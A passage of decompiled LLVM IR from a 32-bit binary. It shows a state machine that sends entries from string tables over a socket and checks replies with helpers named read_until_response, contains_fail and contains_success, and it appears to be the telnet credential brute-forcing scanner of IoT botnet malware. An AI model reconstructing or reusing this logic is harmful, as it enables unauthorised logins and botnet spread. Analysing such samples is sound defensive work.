  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c1f4 = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c1f4 = inttoptr i32 %v3_805c1f4 to i8*
  store i8 1, i8* %v4_805c1f4, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c1fe:                             ; preds = %dec_label_pc_805c19c
  store i32 %v1_805baf0, i32* %eax.global-to-local, align 4
  %v2_805c219 = load i32, i32* %v1_805baf3, align 4
  store i32 %v2_805c219, i32* %eax.global-to-local, align 4
  %v1_805c21b = add i32 %v2_805c219, 6
  store i32 %v1_805c21b, i32* @ebx, align 4
  %v0_805c21e = load i32, i32* @esp, align 4
  %v1_805c21e = inttoptr i32 %v0_805c21e to i32*
  store i32 0, i32* %v1_805c21e, align 4
  %v1_805c225 = inttoptr i32 %v5_805bfd1 to i32*
  %v2_805c225 = call i32 @__GI_time(i32* %v1_805c225)
  store i32 %v2_805c225, i32* %eax.global-to-local, align 4
  %v0_805c22a = load i32, i32* @ebx, align 4
  %v7_805c22a = icmp ult i32 %v0_805c22a, %v2_805c225
  %v1_805c22c = icmp eq i1 %v7_805c22a, false
  br i1 %v1_805c22c, label %dec_label_pc_805cc2b, label %dec_label_pc_805c232

dec_label_pc_805c232:                             ; preds = %dec_label_pc_805c1fe
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805c248 = load i32, i32* %v3_805bf4f, align 4
  store i32 %v4_805c248, i32* %eax.global-to-local, align 4
  %v1_805c24b = load i32, i32* @esp, align 4
  %v2_805c24b = inttoptr i32 %v1_805c24b to i32*
  store i32 %v4_805c248, i32* %v2_805c24b, align 4
  %v0_805c24e = load i8*, i8** %stack_var_-336, align 4
  %v1_805c24e = ptrtoint i8* %v0_805c24e to i32
  %v2_805c24e = call i32 @sclose(i32 %v1_805c24e)
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c284 = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c284 = inttoptr i32 %v3_805c284 to i8*
  store i8 1, i8* %v4_805c284, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c28e:                             ; preds = %dec_label_pc_805bb26
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  %v1_805c2a6 = add i32 %v2_805baee, 24
  store i32 %v1_805c2a6, i32* %eax.global-to-local, align 4
  %v1_805c2a9 = inttoptr i32 %v1_805c2a6 to i32*
  %v2_805c2a9 = load i32, i32* %v1_805c2a9, align 4
  store i32 %v2_805c2a9, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c2c1 = inttoptr i32 %v2_805baee to i32*
  %v4_805c2c1 = load i32, i32* %v3_805c2c1, align 4
  store i32 %v4_805c2c1, i32* %edx.global-to-local, align 4
  %v0_805c2c4 = load i32, i32* @esp, align 4
  %v1_805c2c4 = add i32 %v0_805c2c4, 16
  %v2_805c2c4 = inttoptr i32 %v1_805c2c4 to i32*
  store i32 134682724, i32* %v2_805c2c4, align 4
  %v0_805c2cc = load i32, i32* @esp, align 4
  %v1_805c2cc = add i32 %v0_805c2cc, 12
  %v2_805c2cc = inttoptr i32 %v1_805c2cc to i32*
  store i32 32676, i32* %v2_805c2cc, align 4
  %v0_805c2d4 = load i32, i32* @ebx, align 4
  %v1_805c2d4 = load i32, i32* @esp, align 4
  %v2_805c2d4 = add i32 %v1_805c2d4, 8
  %v3_805c2d4 = inttoptr i32 %v2_805c2d4 to i32*
  store i32 %v0_805c2d4, i32* %v3_805c2d4, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_805c2db = load i32, i32* @esp, align 4
  %v2_805c2db = add i32 %v1_805c2db, 4
  %v3_805c2db = inttoptr i32 %v2_805c2db to i32*
  store i32 10, i32* %v3_805c2db, align 4
  %v0_805c2df = load i32, i32* %edx.global-to-local, align 4
  %v1_805c2df = load i32, i32* @esp, align 4
  %v2_805c2df = inttoptr i32 %v1_805c2df to i32*
  store i32 %v0_805c2df, i32* %v2_805c2df, align 4
  %v2_805c2e2 = call i32 @read_until_response(i32 %v6_805bb3c)
  %v1_805c2e7 = icmp eq i32 %v2_805c2e2, 0
  store i32 %v1_805bade, i32* @edx, align 4
  store i32 %v2_805baee, i32* %eax.global-to-local, align 4
  br i1 %v1_805c2e7, label %dec_label_pc_805c354, label %dec_label_pc_805c2eb

dec_label_pc_805c2eb:                             ; preds = %dec_label_pc_805c28e
  store i32 %v1_805c2a6, i32* %eax.global-to-local, align 4
  %v2_805c306 = load i32, i32* %v1_805c2a9, align 4
  store i32 %v2_805c306, i32* %eax.global-to-local, align 4
  %v1_805c308 = load i32, i32* @esp, align 4
  %v2_805c308 = inttoptr i32 %v1_805c308 to i32*
  store i32 %v2_805c306, i32* %v2_805c308, align 4
  %v0_805c30b = call i32 @contains_fail()
  %v1_805c310 = icmp eq i32 %v0_805c30b, 0
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c310, label %dec_label_pc_805c334, label %dec_label_pc_805c314

dec_label_pc_805c314:                             ; preds = %dec_label_pc_805c2eb
  store i8 0, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c334:                             ; preds = %dec_label_pc_805c2eb
  store i8 3, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c354:                             ; preds = %dec_label_pc_805c28e
  store i32 %v1_805baf0, i32* %eax.global-to-local, align 4
  %v2_805c36f = load i32, i32* %v1_805baf3, align 4
  store i32 %v2_805c36f, i32* %eax.global-to-local, align 4
  %v1_805c371 = add i32 %v2_805c36f, 6
  store i32 %v1_805c371, i32* @ebx, align 4
  %v0_805c374 = load i32, i32* @esp, align 4
  %v1_805c374 = inttoptr i32 %v0_805c374 to i32*
  store i32 0, i32* %v1_805c374, align 4
  %v0_805c37b = load i8*, i8** %stack_var_-336, align 4
  %tmp34 = bitcast i8* %v0_805c37b to i32*
  %v3_805c37b = call i32 @__GI_time(i32* %tmp34)
  store i32 %v3_805c37b, i32* %eax.global-to-local, align 4
  %v0_805c380 = load i32, i32* @ebx, align 4
  %v7_805c380 = icmp ult i32 %v0_805c380, %v3_805c37b
  %v1_805c382 = icmp eq i1 %v7_805c380, false
  br i1 %v1_805c382, label %dec_label_pc_805cc2b, label %dec_label_pc_805c388

dec_label_pc_805c388:                             ; preds = %dec_label_pc_805c354
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c3b9 = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c3b9 = inttoptr i32 %v3_805c3b9 to i8*
  store i8 1, i8* %v4_805c3b9, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c3c3:                             ; preds = %dec_label_pc_805bb26
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c3d9 = add i32 %v2_805bc9b, %v2_805baec
  %v4_805c3d9 = inttoptr i32 %v3_805c3d9 to i8*
  %v5_805c3d9 = load i8, i8* %v4_805c3d9, align 2
  %v6_805c3d9 = zext i8 %v5_805c3d9 to i32
  store i32 %v6_805c3d9, i32* %eax.global-to-local, align 4
  %v1_805c3e1 = mul nuw nsw i32 %v6_805c3d9, 4
  %v2_805c3e1 = add nuw nsw i32 %v1_805c3e1, 134682696
  %v3_805c3e1 = inttoptr i32 %v2_805c3e1 to i32*
  %v4_805c3e1 = load i32, i32* %v3_805c3e1, align 4
  store i32 %v4_805c3e1, i32* %eax.global-to-local, align 4
  %v1_805c3e8 = load i32, i32* @esp, align 4
  %v2_805c3e8 = inttoptr i32 %v1_805c3e8 to i32*
  store i32 %v4_805c3e1, i32* %v2_805c3e8, align 4
  %v3_805c3eb = call i32 @strlen(i8* %v5_805bb44)
  store i32 %v3_805c3eb, i32* @esi, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v5_805c408 = load i8, i8* %v4_805c3d9, align 2
  %v6_805c408 = zext i8 %v5_805c408 to i32
  store i32 %v6_805c408, i32* %eax.global-to-local, align 4
  %v1_805c410 = mul nuw nsw i32 %v6_805c408, 4
  %v2_805c410 = add nuw nsw i32 %v1_805c410, 134682696
  %v3_805c410 = inttoptr i32 %v2_805c410 to i32*
  %v4_805c410 = load i32, i32* %v3_805c410, align 4
  store i32 %v4_805c410, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c42d = inttoptr i32 %v2_805baee to i32*
  %v4_805c42d = load i32, i32* %v3_805c42d, align 4
  store i32 %v4_805c42d, i32* %eax.global-to-local, align 4
  %v0_805c430 = load i32, i32* @esp, align 4
  %v1_805c430 = add i32 %v0_805c430, 12
  %v2_805c430 = inttoptr i32 %v1_805c430 to i32*
  store i32 16384, i32* %v2_805c430, align 4
  %v0_805c438 = load i32, i32* @esi, align 4
  %v1_805c438 = load i32, i32* @esp, align 4
  %v2_805c438 = add i32 %v1_805c438, 8
  %v3_805c438 = inttoptr i32 %v2_805c438 to i32*
  store i32 %v0_805c438, i32* %v3_805c438, align 4
  %v0_805c43c = load i32, i32* @ebx, align 4
  %v1_805c43c = load i32, i32* @esp, align 4
  %v2_805c43c = add i32 %v1_805c43c, 4
  %v3_805c43c = inttoptr i32 %v2_805c43c to i32*
  store i32 %v0_805c43c, i32* %v3_805c43c, align 4
  %v0_805c440 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c440 = load i32, i32* @esp, align 4
  %v2_805c440 = inttoptr i32 %v1_805c440 to i32*
  store i32 %v0_805c440, i32* %v2_805c440, align 4
  %v0_805c443 = load i8*, i8** %stack_var_-336, align 4
  %v1_805c443 = ptrtoint i8* %v0_805c443 to i32
  %v2_805c443 = load i32, i32* %stack_var_-332, align 4
  %v3_805c443 = load i32, i32* %stack_var_-328, align 4
  %v5_805c443 = call i32 @__libc_send(i32 %v1_805c443, i32 %v2_805c443, i32 %v3_805c443, i32 %stack_var_-324.242)
  %v2_805c448 = icmp slt i32 %v5_805c443, 0
  %v1_805c44a = icmp eq i1 %v2_805c448, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c44a, label %dec_label_pc_805c487, label %dec_label_pc_805c44c

dec_label_pc_805c44c:                             ; preds = %dec_label_pc_805c3c3
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c47d = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c47d = inttoptr i32 %v3_805c47d to i8*
  store i8 1, i8* %v4_805c47d, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c487:                             ; preds = %dec_label_pc_805c3c3
  %v4_805c49d = load i32, i32* %v3_805c42d, align 4
  store i32 %v4_805c49d, i32* %eax.global-to-local, align 4
  %v0_805c4a0 = load i32, i32* @esp, align 4
  %v1_805c4a0 = add i32 %v0_805c4a0, 12
  %v2_805c4a0 = inttoptr i32 %v1_805c4a0 to i32*
  store i32 16384, i32* %v2_805c4a0, align 4
  %v0_805c4a8 = load i32, i32* @esp, align 4
  %v1_805c4a8 = add i32 %v0_805c4a8, 8
  %v2_805c4a8 = inttoptr i32 %v1_805c4a8 to i32*
  store i32 2, i32* %v2_805c4a8, align 4
  %v0_805c4b0 = load i32, i32* @esp, align 4
  %v1_805c4b0 = add i32 %v0_805c4b0, 4
  %v2_805c4b0 = inttoptr i32 %v1_805c4b0 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_806cb3d.1324 to i32), i32* %v2_805c4b0, align 4
  %v0_805c4b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c4b8 = load i32, i32* @esp, align 4
  %v2_805c4b8 = inttoptr i32 %v1_805c4b8 to i32*
  store i32 %v0_805c4b8, i32* %v2_805c4b8, align 4
  %v0_805c4bb = load i8*, i8** %stack_var_-336, align 4
  %v1_805c4bb = ptrtoint i8* %v0_805c4bb to i32
  %v2_805c4bb = load i32, i32* %stack_var_-332, align 4
  %v3_805c4bb = load i32, i32* %stack_var_-328, align 4
  %v5_805c4bb = call i32 @__libc_send(i32 %v1_805c4bb, i32 %v2_805c4bb, i32 %v3_805c4bb, i32 %stack_var_-324.242)
  %v2_805c4c0 = icmp slt i32 %v5_805c4bb, 0
  %v1_805c4c2 = icmp eq i1 %v2_805c4c0, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c4c2, label %dec_label_pc_805c4ff, label %dec_label_pc_805c4c4

dec_label_pc_805c4c4:                             ; preds = %dec_label_pc_805c487
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c4f5 = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c4f5 = inttoptr i32 %v3_805c4f5 to i8*
  store i8 1, i8* %v4_805c4f5, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c4ff:                             ; preds = %dec_label_pc_805c487
  store i8 4, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c51f:                             ; preds = %dec_label_pc_805bb26
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  %v1_805c537 = add i32 %v2_805baee, 24
  store i32 %v1_805c537, i32* %eax.global-to-local, align 4
  %v1_805c53a = inttoptr i32 %v1_805c537 to i32*
  %v2_805c53a = load i32, i32* %v1_805c53a, align 4
  store i32 %v2_805c53a, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c552 = inttoptr i32 %v2_805baee to i32*
  %v4_805c552 = load i32, i32* %v3_805c552, align 4
  store i32 %v4_805c552, i32* %edx.global-to-local, align 4
  %v0_805c555 = load i32, i32* @esp, align 4
  %v1_805c555 = add i32 %v0_805c555, 16
  %v2_805c555 = inttoptr i32 %v1_805c555 to i32*
  store i32 ptrtoint (i32* @global_var_8071864 to i32), i32* %v2_805c555, align 4
  %v0_805c55d = load i32, i32* @esp, align 4
  %v1_805c55d = add i32 %v0_805c55d, 12
  %v2_805c55d = inttoptr i32 %v1_805c55d to i32*
  store i32 32676, i32* %v2_805c55d, align 4
  %v0_805c565 = load i32, i32* @ebx, align 4
  %v1_805c565 = load i32, i32* @esp, align 4
  %v2_805c565 = add i32 %v1_805c565, 8
  %v3_805c565 = inttoptr i32 %v2_805c565 to i32*
  store i32 %v0_805c565, i32* %v3_805c565, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_805c56c = load i32, i32* @esp, align 4
  %v2_805c56c = add i32 %v1_805c56c, 4
  %v3_805c56c = inttoptr i32 %v2_805c56c to i32*
  store i32 10, i32* %v3_805c56c, align 4
  %v0_805c570 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c570 = load i32, i32* @esp, align 4
  %v2_805c570 = inttoptr i32 %v1_805c570 to i32*
  store i32 %v0_805c570, i32* %v2_805c570, align 4
  %v2_805c573 = call i32 @read_until_response(i32 %v6_805bb3c)
  %v1_805c578 = icmp eq i32 %v2_805c573, 0
  store i32 %v1_805bade, i32* @edx, align 4
  store i32 %v2_805baee, i32* %eax.global-to-local, align 4
  br i1 %v1_805c578, label %dec_label_pc_805c5e5, label %dec_label_pc_805c57c

dec_label_pc_805c57c:                             ; preds = %dec_label_pc_805c51f
  store i32 %v1_805c537, i32* %eax.global-to-local, align 4
  %v2_805c597 = load i32, i32* %v1_805c53a, align 4
  store i32 %v2_805c597, i32* %eax.global-to-local, align 4
  %v1_805c599 = load i32, i32* @esp, align 4
  %v2_805c599 = inttoptr i32 %v1_805c599 to i32*
  store i32 %v2_805c597, i32* %v2_805c599, align 4
  %v0_805c59c = call i32 @contains_fail()
  %v1_805c5a1 = icmp eq i32 %v0_805c59c, 0
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c5a1, label %dec_label_pc_805c5c5, label %dec_label_pc_805c5a5

dec_label_pc_805c5a5:                             ; preds = %dec_label_pc_805c57c
  store i8 0, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c5c5:                             ; preds = %dec_label_pc_805c57c
  store i8 5, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c5e5:                             ; preds = %dec_label_pc_805c51f
  store i32 %v1_805baf0, i32* %eax.global-to-local, align 4
  %v2_805c600 = load i32, i32* %v1_805baf3, align 4
  store i32 %v2_805c600, i32* %eax.global-to-local, align 4
  %v1_805c602 = add i32 %v2_805c600, 6
  store i32 %v1_805c602, i32* @ebx, align 4
  %v0_805c605 = load i32, i32* @esp, align 4
  %v1_805c605 = inttoptr i32 %v0_805c605 to i32*
  store i32 0, i32* %v1_805c605, align 4
  %v0_805c60c = load i8*, i8** %stack_var_-336, align 4
  %tmp35 = bitcast i8* %v0_805c60c to i32*
  %v3_805c60c = call i32 @__GI_time(i32* %tmp35)
  store i32 %v3_805c60c, i32* %eax.global-to-local, align 4
  %v0_805c611 = load i32, i32* @ebx, align 4
  %v7_805c611 = icmp ult i32 %v0_805c611, %v3_805c60c
  %v1_805c613 = icmp eq i1 %v7_805c611, false
  br i1 %v1_805c613, label %dec_label_pc_805cc2b, label %dec_label_pc_805c619

dec_label_pc_805c619:                             ; preds = %dec_label_pc_805c5e5
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c64a = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c64a = inttoptr i32 %v3_805c64a to i8*
  store i8 1, i8* %v4_805c64a, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c654:                             ; preds = %dec_label_pc_805bb26
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c66a = add i32 %v2_805bc60, %v2_805baec
  %v4_805c66a = inttoptr i32 %v3_805c66a to i8*
  %v5_805c66a = load i8, i8* %v4_805c66a, align 1
  %v6_805c66a = zext i8 %v5_805c66a to i32
  store i32 %v6_805c66a, i32* %eax.global-to-local, align 4
  %v1_805c672 = mul nuw nsw i32 %v6_805c66a, 4
  %v2_805c672 = add nuw nsw i32 %v1_805c672, 134682708
  %v3_805c672 = inttoptr i32 %v2_805c672 to i32*
  %v4_805c672 = load i32, i32* %v3_805c672, align 4
  store i32 %v4_805c672, i32* %eax.global-to-local, align 4
  %v1_805c679 = load i32, i32* @esp, align 4
  %v2_805c679 = inttoptr i32 %v1_805c679 to i32*
  store i32 %v4_805c672, i32* %v2_805c679, align 4
  %v3_805c67c = call i32 @strlen(i8* %v5_805bb44)
  store i32 %v3_805c67c, i32* @esi, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v5_805c699 = load i8, i8* %v4_805c66a, align 1
  %v6_805c699 = zext i8 %v5_805c699 to i32
  store i32 %v6_805c699, i32* %eax.global-to-local, align 4
  %v1_805c6a1 = mul nuw nsw i32 %v6_805c699, 4
  %v2_805c6a1 = add nuw nsw i32 %v1_805c6a1, 134682708
  %v3_805c6a1 = inttoptr i32 %v2_805c6a1 to i32*
  %v4_805c6a1 = load i32, i32* %v3_805c6a1, align 4
  store i32 %v4_805c6a1, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c6be = inttoptr i32 %v2_805baee to i32*
  %v4_805c6be = load i32, i32* %v3_805c6be, align 4
  store i32 %v4_805c6be, i32* %eax.global-to-local, align 4
  %v0_805c6c1 = load i32, i32* @esp, align 4
  %v1_805c6c1 = add i32 %v0_805c6c1, 12
  %v2_805c6c1 = inttoptr i32 %v1_805c6c1 to i32*
  store i32 16384, i32* %v2_805c6c1, align 4
  %v0_805c6c9 = load i32, i32* @esi, align 4
  %v1_805c6c9 = load i32, i32* @esp, align 4
  %v2_805c6c9 = add i32 %v1_805c6c9, 8
  %v3_805c6c9 = inttoptr i32 %v2_805c6c9 to i32*
  store i32 %v0_805c6c9, i32* %v3_805c6c9, align 4
  %v0_805c6cd = load i32, i32* @ebx, align 4
  %v1_805c6cd = load i32, i32* @esp, align 4
  %v2_805c6cd = add i32 %v1_805c6cd, 4
  %v3_805c6cd = inttoptr i32 %v2_805c6cd to i32*
  store i32 %v0_805c6cd, i32* %v3_805c6cd, align 4
  %v0_805c6d1 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c6d1 = load i32, i32* @esp, align 4
  %v2_805c6d1 = inttoptr i32 %v1_805c6d1 to i32*
  store i32 %v0_805c6d1, i32* %v2_805c6d1, align 4
  %v0_805c6d4 = load i8*, i8** %stack_var_-336, align 4
  %v1_805c6d4 = ptrtoint i8* %v0_805c6d4 to i32
  %v2_805c6d4 = load i32, i32* %stack_var_-332, align 4
  %v3_805c6d4 = load i32, i32* %stack_var_-328, align 4
  %v5_805c6d4 = call i32 @__libc_send(i32 %v1_805c6d4, i32 %v2_805c6d4, i32 %v3_805c6d4, i32 %stack_var_-324.242)
  %v2_805c6d9 = icmp slt i32 %v5_805c6d4, 0
  %v1_805c6db = icmp eq i1 %v2_805c6d9, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c6db, label %dec_label_pc_805c718, label %dec_label_pc_805c6dd

dec_label_pc_805c6dd:                             ; preds = %dec_label_pc_805c654
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c70e = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c70e = inttoptr i32 %v3_805c70e to i8*
  store i8 1, i8* %v4_805c70e, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c718:                             ; preds = %dec_label_pc_805c654
  %v4_805c72e = load i32, i32* %v3_805c6be, align 4
  store i32 %v4_805c72e, i32* %eax.global-to-local, align 4
  %v0_805c731 = load i32, i32* @esp, align 4
  %v1_805c731 = add i32 %v0_805c731, 12
  %v2_805c731 = inttoptr i32 %v1_805c731 to i32*
  store i32 16384, i32* %v2_805c731, align 4
  %v0_805c739 = load i32, i32* @esp, align 4
  %v1_805c739 = add i32 %v0_805c739, 8
  %v2_805c739 = inttoptr i32 %v1_805c739 to i32*
  store i32 2, i32* %v2_805c739, align 4
  %v0_805c741 = load i32, i32* @esp, align 4
  %v1_805c741 = add i32 %v0_805c741, 4
  %v2_805c741 = inttoptr i32 %v1_805c741 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_806cb3d.1324 to i32), i32* %v2_805c741, align 4
  %v0_805c749 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c749 = load i32, i32* @esp, align 4
  %v2_805c749 = inttoptr i32 %v1_805c749 to i32*
  store i32 %v0_805c749, i32* %v2_805c749, align 4
  %v0_805c74c = load i8*, i8** %stack_var_-336, align 4
  %v1_805c74c = ptrtoint i8* %v0_805c74c to i32
  %v2_805c74c = load i32, i32* %stack_var_-332, align 4
  %v3_805c74c = load i32, i32* %stack_var_-328, align 4
  %v5_805c74c = call i32 @__libc_send(i32 %v1_805c74c, i32 %v2_805c74c, i32 %v3_805c74c, i32 %stack_var_-324.242)
  %v2_805c751 = icmp slt i32 %v5_805c74c, 0
  %v1_805c753 = icmp eq i1 %v2_805c751, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c753, label %dec_label_pc_805c790, label %dec_label_pc_805c755

dec_label_pc_805c755:                             ; preds = %dec_label_pc_805c718
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c786 = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c786 = inttoptr i32 %v3_805c786 to i8*
  store i8 1, i8* %v4_805c786, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c790:                             ; preds = %dec_label_pc_805c718
  store i8 6, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c7b0:                             ; preds = %dec_label_pc_805bb26
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  %v1_805c7c8 = add i32 %v2_805baee, 24
  store i32 %v1_805c7c8, i32* %eax.global-to-local, align 4
  %v1_805c7cb = inttoptr i32 %v1_805c7c8 to i32*
  %v2_805c7cb = load i32, i32* %v1_805c7cb, align 4
  store i32 %v2_805c7cb, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c7e3 = inttoptr i32 %v2_805baee to i32*
  %v4_805c7e3 = load i32, i32* %v3_805c7e3, align 4
  store i32 %v4_805c7e3, i32* %edx.global-to-local, align 4
  %v0_805c7e6 = load i32, i32* @esp, align 4
  %v1_805c7e6 = add i32 %v0_805c7e6, 16
  %v2_805c7e6 = inttoptr i32 %v1_805c7e6 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_80718c0.1325 to i32), i32* %v2_805c7e6, align 4
  %v0_805c7ee = load i32, i32* @esp, align 4
  %v1_805c7ee = add i32 %v0_805c7ee, 12
  %v2_805c7ee = inttoptr i32 %v1_805c7ee to i32*
  store i32 32676, i32* %v2_805c7ee, align 4
  %v0_805c7f6 = load i32, i32* @ebx, align 4
  %v1_805c7f6 = load i32, i32* @esp, align 4
  %v2_805c7f6 = add i32 %v1_805c7f6, 8
  %v3_805c7f6 = inttoptr i32 %v2_805c7f6 to i32*
  store i32 %v0_805c7f6, i32* %v3_805c7f6, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_805c7fd = load i32, i32* @esp, align 4
  %v2_805c7fd = add i32 %v1_805c7fd, 4
  %v3_805c7fd = inttoptr i32 %v2_805c7fd to i32*
  store i32 10, i32* %v3_805c7fd, align 4
  %v0_805c801 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c801 = load i32, i32* @esp, align 4
  %v2_805c801 = inttoptr i32 %v1_805c801 to i32*
  store i32 %v0_805c801, i32* %v2_805c801, align 4
  %v2_805c804 = call i32 @read_until_response(i32 %v6_805bb3c)
  store i32 %v2_805c804, i32* %eax.global-to-local, align 4
  %v1_805c809 = icmp eq i32 %v2_805c804, 0
  br i1 %v1_805c809, label %dec_label_pc_805ca68, label %dec_label_pc_805c811

dec_label_pc_805c811:                             ; preds = %dec_label_pc_805c7b0
  store i32 %storemerge44, i32* @ebx, align 4
  %v0_805c814 = load i32, i32* @esp, align 4
  %v1_805c814 = inttoptr i32 %v0_805c814 to i32*
  store i32 0, i32* %v1_805c814, align 4
  %v0_805c81b = load i8*, i8** %stack_var_-336, align 4
  %tmp36 = bitcast i8* %v0_805c81b to i32*
  %v3_805c81b = call i32 @__GI_time(i32* %tmp36)
  store i32 %v3_805c81b, i32* @esi, align 4
  %v0_805c825 = load i32, i32* @ebx, align 4
  %v2_805c835 = mul i32 %v0_805c825, 28
  %v1_805c839 = add i32 %v2_805c837, %v2_805c835
  %v2_805c83c = inttoptr i32 %v1_805c839 to i32*
  store i32 %v3_805c81b, i32* %v2_805c83c, align 4
  store i32 %v1_805bade, i32* @edx, align 4
  store i32 %v1_805c7c8, i32* %eax.global-to-local, align 4
  %v2_805c859 = load i32, i32* %v1_805c7cb, align 4
  store i32 %v2_805c859, i32* %eax.global-to-local, align 4
  %v1_805c85b = load i32, i32* @esp, align 4
  %v2_805c85b = inttoptr i32 %v1_805c85b to i32*
  store i32 %v2_805c859, i32* %v2_805c85b, align 4
  %v0_805c85e = call i32 @contains_fail()
  %v1_805c863 = icmp eq i32 %v0_805c85e, 0
  store i32 %v1_805bade, i32* @edx, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c863, label %dec_label_pc_805c887, label %dec_label_pc_805c867

dec_label_pc_805c867:                             ; preds = %dec_label_pc_805c811
  store i8 0, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c887:                             ; preds = %dec_label_pc_805c811
  store i32 %v1_805c7c8, i32* %eax.global-to-local, align 4
  %v2_805c8a2 = load i32, i32* %v1_805c7cb, align 4
  store i32 %v2_805c8a2, i32* %eax.global-to-local, align 4
  %v1_805c8a4 = load i32, i32* @esp, align 4
  %v2_805c8a4 = inttoptr i32 %v1_805c8a4 to i32*
  store i32 %v2_805c8a2, i32* %v2_805c8a4, align 4
  %v0_805c8a7 = call i32 @contains_success()
  %v1_805c8ac = icmp eq i32 %v0_805c8a7, 0
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
